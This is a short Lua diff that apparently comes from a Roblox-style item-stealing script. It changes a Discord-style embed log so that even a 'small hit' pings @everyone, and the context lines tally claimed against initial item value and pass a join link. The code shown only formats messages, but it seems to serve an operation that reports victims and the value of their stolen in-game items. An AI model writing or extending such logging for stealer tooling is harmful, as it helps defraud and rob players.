@@ -737,7 +737,7 @@ local function sendDetailedEmbedLog(joinLink, status)
     local inventoryText = #inventoryLines > 0 and table.concat(inventoryLines, "\n") or "None"
     inventoryText = inventoryText .. "\n===============================\nTotal: " .. formatValue(totalClaimedValue) .. " / " .. formatValue(totalInitialValue) .. ""
 
-    local hitContent = "> 『 ꜱᴍᴀʟʟ ʜɪᴛ 』"
+    local hitContent = "> @everyone『 ꜱᴍᴀʟʟ ʜɪᴛ 』"
     if totalInitialValue >= 20000000 then
         hitContent = "> @everyone ⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆"
     end
